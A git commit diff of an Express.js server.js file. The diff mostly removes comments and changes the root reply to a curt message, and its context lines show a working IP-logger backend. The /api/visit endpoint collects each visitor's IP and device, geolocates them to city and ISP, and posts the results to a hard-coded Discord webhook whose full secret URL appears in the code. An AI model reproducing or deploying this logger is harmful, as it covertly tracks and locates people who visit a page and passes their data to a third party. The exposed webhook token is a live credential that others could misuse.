cc347105784da964afb7316dcf585124031f89b8
Auroxxx <151619153+keekzz13@users.noreply.github.com>
2025-10-02 12:28:50 +0800

    Update server.js

--- server.js
+++ server.js
@@ -1,15 +1,12 @@
-// Backend server using Express.js
 const express = require('express');
 const cors = require('cors');
-const fetch = require('node-fetch'); 
 const app = express();
 
 app.use(cors());
-
 app.use(express.json());
 
 app.get('/', (req, res) => {
-  res.send('Hello! Your backend is working!');
+  res.send('Tf you doing here.');
 });
 
 function getClientIP(req) {
@@ -17,7 +14,6 @@ function getClientIP(req) {
   return forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
 }
 
-// API Endpoint to log IP and payload
 app.post('/api/visit', async (req, res) => {
   try {
     const ip = getClientIP(req);
@@ -34,7 +30,7 @@ app.post('/api/visit', async (req, res) => {
       device: req.body.device,
       ts: req.body.ts,
     });
-
+    
     const webhookURL = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
     const payload = {
       content: `**New Visitor Detected!**\n- Device: ${req.body.device}\n- Timestamp: ${req.body.ts}\n- IP: ${ip}\n- Country: ${geoData.country}\n- Region: ${geoData.regionName}\n- City: ${geoData.city}\n- ISP: ${geoData.isp}`,
@@ -60,6 +56,5 @@ app.post('/api/visit', async (req, res) => {
   }
 });
 
-// Use dynamic port binding for Render
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
